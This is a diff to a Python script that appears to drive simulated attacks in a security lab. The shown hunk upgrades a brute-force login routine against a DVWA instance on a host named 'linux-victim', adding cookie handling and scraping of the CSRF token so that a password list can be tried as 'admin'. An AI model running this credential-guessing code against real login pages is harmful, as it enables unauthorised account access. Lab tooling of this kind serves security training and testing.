@@ -3,10 +3,12 @@ Covers DVWA web attacks, Linux victim attacks, and Windows guest attacks.
 """
 import datetime
 import ftplib
+import http.cookiejar
 import json
 import logging
 from logging.handlers import RotatingFileHandler
 import os
+import re
 import subprocess
 import sys
 import time
@@ -105,16 +107,33 @@ def web():
 def dvwa_bruteforce():
     url = 'http://linux-victim/dvwa/login.php'
     passwords = ['123456', 'password123', 'admin123', 'qwerty', 'password']
+    cj = http.cookiejar.CookieJar()
+    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
+
     for pwd in passwords:
-        data = urllib.parse.urlencode({
+        user_token = ''
+        try:
+            with opener.open(url, timeout=10) as get_resp:
+                html = get_resp.read().decode(errors='replace')
+                m = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([^'\"]+)['\"]", html)
+                if m:
+                    user_token = m.group(1)
+        except Exception:
+            pass
+
+        data = {
             'username': 'admin',
             'password': pwd,
             'Login': 'Login'
-        }).encode('utf-8')
-        req = urllib.request.Request(url, data=data, method='POST')
+        }
+        if user_token:
+            data['user_token'] = user_token
+
+        encoded_data = urllib.parse.urlencode(data).encode('utf-8')
+        req = urllib.request.Request(url, data=encoded_data, method='POST')
         for attempt in range(5):
             try:
-                with urllib.request.urlopen(req, timeout=10) as resp:
+                with opener.open(req, timeout=10) as resp:
                     resp.read()
                 break
             except urllib.error.HTTPError:
